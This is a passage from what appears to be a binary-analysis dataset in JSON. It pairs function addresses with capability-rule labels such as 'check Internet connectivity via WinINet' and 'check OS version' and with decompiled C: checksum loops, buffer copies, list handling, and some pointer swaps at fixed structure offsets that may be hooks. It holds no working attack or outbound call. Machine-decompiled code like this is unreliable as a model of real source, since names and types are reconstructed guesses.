*puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (7 < arg2) {\n        uVar19 = arg2 >> 3;\n        arg2._0_4_ = arg2 + (arg2 >> 3) * -8;\n        do {\n            puVar1 = arg1 + 2;\n            puVar2 = arg1 + 3;\n            puVar3 = arg1 + 1;\n            uVar16 = *arg1;\n            arg1 = arg1 + 4;\n            uVar18 = uVar18 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (1 < arg2) {\n        uVar17 = (arg2 - 2 >> 1) + 1;\n        uVar19 = uVar17;\n        arg2._0_4_ = arg2 + uVar17 * -2;\n        do {\n            uVar16 = *arg1;\n            arg1 = arg1 + 1;\n            uVar18 = uVar18 + uVar16;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (arg2 == 1) {\n        uVar18 = uVar18 + *arg1;\n    }\n    uVar18 = (uVar18 >> 0x10) + (uVar18 & 0xffff);\n    return ~((uVar18 >> 0x10) + uVar18);\n}\n",
        "token_count": 892
    },
    "0004136c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0004136c(uint16_t *arg1, uint16_t *arg2, ulong arg3)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    \n    uVar18 = arg1[0x11] + arg1[0x10] + arg1[0xf] + arg1[0xe] + arg1[0xd] + arg1[0xc] + arg1[0xb] + arg1[10] + arg1[9] +\n             arg1[8] + arg1[7] + arg1[6] + arg1[5] + arg1[4] + arg1[3] + arg1[2] + arg1[1] + *arg1;\n    if (0x1f < arg3) {\n        uVar19 = arg3 >> 5;\n        arg3._0_4_ = arg3 + (arg3 >> 5) * -0x20;\n        do {\n            puVar1 = arg2 + 0xe;\n            puVar2 = arg2 + 0xf;\n            puVar3 = arg2 + 0xd;\n            puVar4 = arg2 + 0xc;\n            puVar5 = arg2 + 0xb;\n            puVar6 = arg2 + 10;\n            puVar7 = arg2 + 9;\n            puVar8 = arg2 + 8;\n            puVar9 = arg2 + 7;\n            puVar10 = arg2 + 6;\n            puVar11 = arg2 + 5;\n            puVar12 = arg2 + 4;\n            puVar13 = arg2 + 3;\n            puVar14 = arg2 + 2;\n            puVar15 = arg2 + 1;\n            uVar16 = *arg2;\n            arg2 = arg2 + 0x10;\n            uVar18 = uVar18 + uVar16 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (7 < arg3) {\n        uVar19 = arg3 >> 3;\n        arg3._0_4_ = arg3 + (arg3 >> 3) * -8;\n        do {\n            puVar1 = arg2 + 2;\n            puVar2 = arg2 + 3;\n            puVar3 = arg2 + 1;\n            uVar16 = *arg2;\n            arg2 = arg2 + 4;\n            uVar18 = uVar18 + uVar16 + *puVar2 + *puVar1 + *puVar3;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (1 < arg3) {\n        uVar17 = (arg3 - 2 >> 1) + 1;\n        uVar19 = uVar17;\n        arg3._0_4_ = arg3 + uVar17 * -2;\n        do {\n            uVar16 = *arg2;\n            arg2 = arg2 + 1;\n            uVar18 = uVar18 + uVar16;\n            uVar19 = uVar19 - 1;\n        } while (uVar19 != 0);\n    }\n    if (arg3 == 1) {\n        uVar18 = uVar18 + *arg2;\n    }\n    uVar18 = (uVar18 >> 0x10) + (uVar18 & 0xffff);\n    return ~((uVar18 >> 0x10) + uVar18);\n}\n",
        "token_count": 1013
    },
    "000415d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000415d4(int64_t arg1, ulong noname_1, ulong arg3, char *arg4)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    \n    uVar5 = 0;\ncode_r0x000415e0:\n    while ((iVar3 = uVar5,  noname_1 != '\\0' && (noname_1 != '+'))) {\n        if (noname_1 != ',') {\n            if (noname_1 != '2') {\n                if (noname_1 == '3') {\n                    if (uVar5 + 0xc <= arg3) {\n                        noname_1._0_1_ = *(uVar5 + arg1);\n                        uVar4 = iVar3 + 4 + *(uVar5 + 1 + arg1) * 4;\n                        goto code_r0x00041643;\n                    }\n                }\n                else {\n                    if (noname_1 == '<') break;\n                    if (noname_1 != '=') {\n                        *arg4 = noname_1;\n                        return uVar5;\n                    }\n                    if (uVar5 + 3 <= arg3) {\n                        uVar2 = *(uVar5 + 1 + arg1);\n                        noname_1._0_1_ = *(uVar5 + arg1);\n                        goto code_r0x0004163e;\n                    }\n                }\n            }\n            goto code_r0x00041648;\n        }\n        if (arg3 < uVar5 + 8) goto code_r0x00041648;\n        pcVar1 = uVar5 + arg1;\n        uVar5 = iVar3 + 8;\n        noname_1._0_1_ = *pcVar1;\n    }\n    if (uVar5 + 2 <= arg3) {\n        noname_1._0_1_ = *(uVar5 + arg1);\n        uVar2 = *(uVar5 + 1 + arg1);\ncode_r0x0004163e:\n        uVar4 = iVar3 + 8 + uVar2 * 8;\ncode_r0x00041643:\n        uVar5 = uVar4;\n        if (uVar4 < arg3) goto code_r0x000415e0;\n    }\ncode_r0x00041648:\n    uVar5 = arg3;\n    noname_1._0_1_ = ';';\n    goto code_r0x000415e0;\n}\n",
        "token_count": 568
    },
    "00041694": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00041694(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    uint64_t uVar5;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uint32_t in_stack_00000038;\n    uint in_stack_00000040;\n    uchar in_stack_00000048;\n    uint in_stack_00000050;\n    ulong in_stack_00000058;\n    uint32_t in_stack_00000060;\n    uchar auStack80 [16];\n    \n    uVar5 = arg3;\n    if (*0x803b0 == 0) {\n        iVar2 = in_stack_00000028 + uVar5;\n        iVar1 = iVar2 + in_stack_00000038;\n        piVar4 = fcn.00030cc4(in_stack_00000060 + 0x50 + iVar1);\n        if (piVar4 != NULL) {\n            fcn.0006677c(piVar4, 0, 0x50);\n            fcn.0006670a(piVar4 + 0x4c, arg2, uVar5);\n            fcn.0006670a(uVar5 + 0x4c + piVar4, arg4, in_stack_00000028);\n            iVar2 = iVar2 + 0x4c + piVar4;\n            fcn.0006670a(iVar2, in_stack_00000030);\n            iVar1 = iVar1 + 0x4c + piVar4;\n            fcn.0006670a(iVar1, in_stack_00000058);\n            *(piVar4 + 3) = arg3 + in_stack_00000028;\n            piVar4[4] = iVar2;\n            *(piVar4 + 0x2c) = in_stack_00000040;\n            *(piVar4 + 6) = in_stack_00000048;\n            *(piVar4 + 7) = in_stack_00000050;\n            *(piVar4 + 1) = arg1;\n            piVar4[2] = piVar4 + 0x4c;\n            *(piVar4 + 9) = in_stack_00000060;\n            *(piVar4 + 5) = in_stack_00000038;\n            piVar4[8] = iVar1;\n            fcn.00032650(0x803b8, auStack80, 1);\n            piVar3 = piVar4;\n            if (*0x80408 != NULL) {\n                **0x80408 = piVar4;\n                *0x80408 = piVar4;\n                piVar4 = *0x80408;\n                piVar3 = *0x80410;\n            }\n            *0x80410 = piVar3;\n            *0x80408 = piVar4;\n            fcn.00032684(0x803b8, auStack80, 1);\n            fcn.0002fcb8(0x80390);\n        }\n    }\n    return;\n}\n",
        "token_count": 703
    },
    "00041828": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00041828(void)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    uchar auStack24 [8];\n    int64_t iStack16;\n    \n    iVar1 = fcn.000327e0(auStack24);\n    if (iVar1 != 0) {\n        piVar2 = 0x80438;\n        do {\n            if ((*piVar2 != 0) && (*piVar2 == iStack16)) {\n                return 1;\n            }\n            piVar2 = piVar2 + 2;\n        } while (piVar2 < 0x80488);\n    }\n    return 0;\n}\n",
        "token_count": 146
    },
    "000437f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000437f4(ulong *arg1, int64_t arg2, uint64_t arg3, uint64_t *arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uStackX8;\n    int32_t in_stack_00000028;\n    \n    uVar3 = arg1[4];\n    if (uVar3 == 0) {\n        if (arg3 < 0xbb9) {\n            iVar1 = fcn.00046cf4(*arg1, arg1[1], arg1 + 5, 3000);\n            if ((iVar1 != 0) || (uStackX8 == 0)) {\n                return 0;\n            }\n            arg1[4] = uStackX8;\n            arg1[3] = 0;\n            if (uStackX8 < arg3) {\n                arg3 = uStackX8;\n            }\n            arg1[2] = uStackX8 % 3000;\n            *arg4 = arg3;\n            fcn.0006670a(arg2, arg1 + 5, arg3);\n            if (in_stack_00000028 == 0) {\n                arg1[3] = *arg4 % 3000;\n                arg1[4] = arg1[4] - *arg4;\n            }\n        }\n        else {\n            if (in_stack_00000028 != 0) {\n                return 0;\n            }\n            iVar1 = fcn.00046cf4(*arg1, arg1[1], arg2, arg3);\n            if (iVar1 != 0) {\n                return 0;\n            }\n            if (*arg4 == 0) {\n                return 0;\n            }\n        }\n    }\n    else {\n        if (uVar3 < arg3) {\n            arg3 = uVar3;\n        }\n        uVar3 = arg1[3];\n        puVar2 = uVar3 + 0x28 + arg1;\n        uVar4 = arg3;\n        if ((arg1[2] <= uVar3) && (uVar3 = 3000 - uVar3,  uVar3 <= arg3)) {\n            fcn.0006670a(arg2, puVar2, uVar3);\n            puVar2 = arg1 + 5;\n            arg2 = uVar3 + arg2;\n            uVar4 = arg3 - uVar3;\n        }\n        fcn.0006670a(arg2, puVar2, uVar4);\n        if (in_stack_00000028 == 0) {\n            arg1[4] = arg1[4] - arg3;\n            arg1[3] = (arg3 + arg1[3]) % 3000;\n        }\n        *arg4 = arg3;\n    }\n    return 1;\n}\n",
        "token_count": 641
    },
    "000439b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000439b0(ulong *arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    ulong arg1_00;\n    ulong arg2;\n    ulong *arg3;\n    int64_t arg4;\n    int64_t iStackX8;\n    \n    arg4 = 3000;\n    if (arg1[4] != 3000) {\n        if (arg1[4] == 0) {\n            arg2 = arg1[1];\n            arg1[4] = 0;\n            arg1[2] = 0;\n            arg1[3] = 0;\n            arg3 = arg1 + 5;\n            arg1_00 = *arg1;\n        }\n        else {\n            uVar1 = arg1[2];\n            arg2 = arg1[1];\n            arg3 = uVar1 + 0x28 + arg1;\n            if (arg1[3] < uVar1) {\n                arg4 = 3000 - uVar1;\n            }\n            else {\n                arg4 = arg1[3] - uVar1;\n            }\n            arg1_00 = *arg1;\n        }\n        iVar2 = fcn.00046cf4(arg1_00, arg2, arg3, arg4);\n        if ((iVar2 == 0) && (iStackX8 != 0)) {\n            arg1[4] = arg1[4] + iStackX8;\n            arg1[2] = (iStackX8 + arg1[2]) % 3000;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 360
    },
    "00043a7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00043a7c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    char *pcVar5;\n    ulong arg4_00;\n    int64_t *in_stack_00000028;\n    int64_t aiStack408 [2];\n    uchar **ppuStack392;\n    char *pcStack384;\n    int32_t iStack376;\n    uchar *puStack368;\n    ulong uStack360;\n    uint uStack352;\n    uchar auStack344 [8];\n    ulong uStack336;\n    uint uStack328;\n    char acStack312 [128];\n    char acStack184 [128];\n    \n    uVar4 = 0;\n    aiStack408[0] = 0;\n    fcn.0002958c(acStack312, 0x80);\n    iVar3 = -1;\n    pcVar5 = acStack312;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.000638cc(aiStack408, 0x6b4e0, 0, 0);\n    if (iVar2 == 0) {\n        iVar2 = fcn.00063e60(aiStack408[0], 0);\n        if (iVar2 == 0) {\n            arg4_00 = 0x11bfd;\n            if (arg4 != 0) {\n                arg4_00 = 0x158b4;\n            }\n            fcn.00044350(acStack184, 0x80, 0x158ac, arg4_00);\n            fcn.0006677c(&ppuStack392, 0);\n            pcStack384 = acStack184;\n            iVar3 = -1;\n            pcVar5 = acStack184;\n            do {\n                if (iVar3 == 0) break;\n                iVar3 = iVar3 + -1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            ppuStack392 = &puStack368;\n            puStack368 = auStack344;\n            iStack376 = ~iVar3 - 1;\n            uStack336 = 0x11bfd;\n            uStack328 = 1;\n            uStack360 = arg1;\n            uStack352 = arg2;\n            iVar2 = fcn.00064248(aiStack408[0], &ppuStack392, 0);\n            iVar3 = aiStack408[0];\n            if (iVar2 == 0) {\n                if (in_stack_00000028 != NULL) {\n                    aiStack408[0] = 0;\n                    *in_stack_00000028 = iVar3;\n                }\n                uVar4 = 1;\n            }\n        }\n    }\n    if (aiStack408[0] != 0) {\n        fcn.00063b80(aiStack408, 0);\n    }\n    return uVar4;\n}\n",
        "token_count": 712
    },
    "00045820": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00045820(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    \n    if (*0x6b51c != -1) {\n        return 1;\n    }\n    uVar1 = 0;\n    pcVar2 = arg1 + 1;\n    while ((((pcVar2[-1] < 3 || (6 < pcVar2[-1])) || ((*pcVar2 != '\\0' && (*pcVar2 != '\\x01')))) || (*(pcVar2 + 3) != 0)\n           )) {\n        uVar1 = uVar1 + 1;\n        pcVar2 = pcVar2 + 1;\n        if (0x7f < uVar1) {\n            return 0;\n        }\n    }\n    if (uVar1 == 0xffffffff) {\n        *0x6b51c = uVar1;\n        return 0;\n    }\n    *0x6b51c = uVar1;\n    return 1;\n}\n",
        "token_count": 226
    },
    "00045a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00045a10(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    ulong unaff_RBX;\n    int64_t iVar5;\n    uint32_t uVar6;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    \n    if (arg1 != 0) {\n        iVar5 = *(arg1 + 0x10);\n        iVar1 = *(iVar5 + 0x1b0);\n        if ((iVar1 != 0) && (iVar1 != 0x458c8)) {\n            *(iVar5 + 0x288) = iVar1;\n            *(iVar5 + 0x1b0) = 0x458c8;\n        }\n        iVar1 = *(iVar5 + 0x280);\n        uVar6 = 0xffffffff;\n        if (iVar1 != 0) {\n            if (*0x6b518 == 0xffffffff) {\n                piVar4 = *(iVar5 + 400);\n                uVar3 = 0;\n                do {\n                    if (*piVar4 == iVar5) {\n                        *0x6b518 = uVar3;\n                        if (uVar3 != 0xffffffff) goto code_r0x00045a93;\n                        break;\n                    }\n                    uVar3 = uVar3 + 1;\n                    piVar4 = piVar4 + 1;\n                } while (uVar3 < 0x400);\n            }\n            else {\ncode_r0x00045a93:\n                if (iVar1 != 0x456d4) {\n                    *(iVar5 + 0x2a0) = iVar1;\n                    *(iVar5 + 0x280) = 0x456d4;\n                }\n            }\n        }\n        iVar5 = *(iVar5 + 0x10);\n        fcn.00045820(iVar5);\n        if ((((*0x6b51c != uVar6) && (arg2 != 0)) && (*0x80550 == 0)) &&\n           (iVar2 = fcn.000550f0(*(iVar5 + *0x6b51c + 0x78), 0x45870, 0x80548, *0x6b51c, unaff_RBX, in_stack_00000000, \n                                 in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                                 in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                 in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                 in_stack_00000068, in_stack_00000070, in_stack_00000078, in_stack_00000080, \n                                 in_stack_00000088, in_stack_00000090, in_stack_00000098),  iVar2 == 0)) {\n            *0x80550 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 861
    },
    "00045b08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00045b08(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    \n    if (arg1 != 0) {\n        iVar1 = *(arg1 + 0x10);\n        if ((*(iVar1 + 0x1b0) != 0) && (*(iVar1 + 0x1b0) == 0x458c8)) {\n            *(iVar1 + 0x1b0) = *(iVar1 + 0x288);\n        }\n        if (*(iVar1 + 0x280) != 0) {\n            if (*0x6b518 == 0xffffffff) {\n                piVar4 = *(iVar1 + 400);\n                uVar2 = 0;\n                do {\n                    if (*piVar4 == iVar1) {\n                        *0x6b518 = uVar2;\n                        if (uVar2 != 0xffffffff) goto code_r0x00045b83;\n                        break;\n                    }\n                    uVar2 = uVar2 + 1;\n                    piVar4 = piVar4 + 1;\n                } while (uVar2 < 0x400);\n            }\n            else {\ncode_r0x00045b83:\n                if (*(iVar1 + 0x280) == 0x456d4) {\n                    *(iVar1 + 0x280) = *(iVar1 + 0x2a0);\n                }\n            }\n        }\n        if (*0x80550 != 0) {\n            iVar3 = fcn.0005540c(0x80548);\n            *0x80550 = -(iVar3 != 0) & *0x80550;\n        }\n    }\n    return;\n}\n",
        "token_count": 393
    },
    "00045bc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00045bc8(void)\n\n{\n    uint auStackX8 [8];\n    \n    if (*0x80564 != '\\0') {\n        *0x80564 = '\\0';\n        auStackX8[0] = fcn.00065ffc();\n        (*_fcn.00011048)(auStackX8, *0x80568);\n        (*_fcn.00011090)(*0x80578);\n        (*_fcn.00011040)();\n        fcn.00033bf0(0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00045ca8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00045ca8(ulong noname_0, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint32_t auStack232 [2];\n    int64_t iStack224;\n    uchar auStack216 [32];\n    uint uStack184;\n    uint uStack176;\n    ulong uStack168;\n    uint32_t uStack40;\n    uchar auStack32 [8];\n    \n    iStack224 = 0;\n    uVar2 = fcn.00032f64(noname_0, &iStack224);\n    auStack232[0] = uVar2;\n    if (auStack232[0] == 0) {\n        if (iStack224 == 0) {\n            uVar2 = 0xc000009d;\n        }\n        else {\n            iVar1 = fcn.0002fc18(auStack32);\n            if (iVar1 == 0) {\n                uVar2 = 0xc0000001;\n            }\n            else {\n                uStack184 = arg2;\n                uStack176 = arg3;\n                uStack168 = arg4;\n                fcn.00066944(auStack232, iStack224, auStack216);\n                if (auStack232[0] == 0x103) {\n                    fcn.0002fce4(auStack32, 0xffffffff);\n                    auStack232[0] = uStack40;\n                }\n                fcn.0002fc94(auStack32);\n                uVar2 = auStack232[0];\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 362
    },
    "00045f18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00045f18(int32_t *arg1)\n\n{\n    int64_t **arg2;\n    int64_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t *arg2_00;\n    int64_t arg2_01;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t auStackX16 [2];\n    int32_t aiStackX24 [4];\n    \n    uVar2 = fcn.00033dd0();\n    if (uVar2 != 0xffffffff) {\n        arg2 = *(arg1 + 2);\n        if (*(arg1 + 10) == '\\0') {\n            iVar6 = 0;\n            iVar4 = 0;\n            iVar5 = 0;\n            for (ppiVar1 = arg2; ppiVar1 != NULL; ppiVar1 = *ppiVar1) {\n                iVar6 = iVar6 + *(ppiVar1 + 5);\n                if (*(ppiVar1 + 5) == 0) {\n                    iVar3 = 1;\n                }\n                else {\n                    iVar3 = (*(ppiVar1 + 0x2c) + *(ppiVar1 + 4) & 0xfff) + 0xfff + *(ppiVar1 + 5) >> 0xc;\n                }\n                iVar4 = iVar4 + iVar3;\n                iVar5 = iVar5 + 1;\n            }\n            arg1[8] = iVar5;\n            arg1[1] = iVar6;\n            *arg1 = iVar4;\n            *(arg1 + 10) = 1;\n        }\n        auStackX16[0] = arg1[1];\n        iVar6 = fcn.00032f00(uVar2, aiStackX24);\n        if ((iVar6 == 0) && ((aiStackX24[0] == 0x80 || (aiStackX24[0] == 0x20)))) {\n            fcn.0004c154(0);\n            iVar6 = fcn.00033b74(uVar2, arg2, auStackX16[0], auStackX16[0]);\n            if (iVar6 != 0) {\n                if (*arg2 == NULL) {\n                    if ((*(arg2 + 10) & 5) == 0) {\n                        arg2_00 = (**0x114d0)(arg2, 0);\n                    }\n                    else {\n                        arg2_00 = arg2[3];\n                    }\n                    auStackX16[0] = *(arg2 + 5);\n                    if (0xe < auStackX16[0]) {\n                        fcn.00045d88(uVar2, arg2_00, 0xe, arg2_00 + 0xe);\n                    }\n                }\n                else {\n                    arg2_01 = fcn.00030cc4(auStackX16[0]);\n                    if (arg2_01 != 0) {\n                        iVar6 = fcn.0006694a(arg2, 0, arg2_01, 0, auStackX16[0], auStackX16);\n                        if ((iVar6 == 0) && (0xe < auStackX16[0])) {\n                            fcn.00045d88(uVar2, arg2_01, 0xe, arg2_01 + 0xe);\n                        }\n                        fcn.00030d24(arg2_01);\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 775
    },
    "000460ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000460ec(uint64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t aiStackX16 [2];\n    int32_t aiStackX24 [4];\n    \n    aiStackX16[0] = arg2;\n    if (((arg2 != 0) && (iVar1 = fcn.000332f8(arg1, aiStackX24),  iVar1 != 0)) && (aiStackX24[0] != 0)) {\n        aiStackX16[0] = 1;\n    }\n    fcn.00045ca8(arg1 & 0xffffffff, 1, 0x1010e, aiStackX16);\n    return;\n}\n",
        "token_count": 159
    },
    "00046144": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00046144(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint64_t arg1_00;\n    uint32_t auStackX16 [2];\n    uint32_t auStackX24 [2];\n    uchar auStackX32 [8];\n    uint uStack568;\n    ushort uStack564;\n    int64_t iStack560;\n    uchar auStack552 [4];\n    uchar auStack548 [4];\n    uchar auStack544 [24];\n    uchar auStack520 [512];\n    \n    arg1_00 = arg1 & 0xffffffff;\n    iVar1 = fcn.000331cc(arg1, auStackX24);\n    if ((iVar1 != 0) || (auStackX24[0] != 0)) {\n        return 0x21590064;\n    }\n    uVar2 = fcn.00032e10(arg1_00, auStack520, 0x100);\n    auStackX16[0] = uVar2;\n    if (auStackX16[0] != 0) {\n        return uVar2;\n    }\n    fcn.00066704(auStack544, auStack520);\n    (**0x11020)(auStackX16, auStack552, &iStack560, auStack548, 0x6b520, 2, *0x80568, arg1_00, auStack544, 0, 0);\n    uVar2 = auStackX16[0];\n    if (auStackX16[0] == 0x103) {\n        uVar2 = fcn.00033d10(arg1_00);\n        auStackX16[0] = uVar2;\n    }\n    if (uVar2 == 0) {\n        auStackX16[0] = fcn.00032fc8(arg1_00, iStack560);\n        if (auStackX16[0] == 0) {\n            fcn.000336d4(arg1_00, 0, 0);\n            auStackX16[0] = fcn.00032f00(arg1_00, auStackX32);\n            if (auStackX16[0] == 0) {\n                auStackX16[0] = fcn.00045ca8(arg1_00, 1, 0x1010e, auStackX32);\n            }\n            auStackX16[0] = fcn.00045ca8(arg1_00, 0, 0x1010102, &uStack568);\n            if (auStackX16[0] != 0) {\n                uStack568 = 0;\n                uStack564 = 0;\n            }\n            fcn.000330cc(arg1_00, &uStack568, 6);\n            iVar1 = fcn.000332f8(arg1_00, auStackX24);\n            if (((iVar1 == 0) && (iVar1 = fcn.00032f64(arg1_00, &iStack560),  iVar1 == 0)) && (iStack560 != 0)) {\n                fcn.00045a10(iStack560, auStackX24[0]);\n            }\n            if (auStackX16[0] == 0) {\n                return 0;\n            }\n        }\n        (**0x11028)(auStack552, iStack560);\n        return 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 766
    },
    "0004653c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
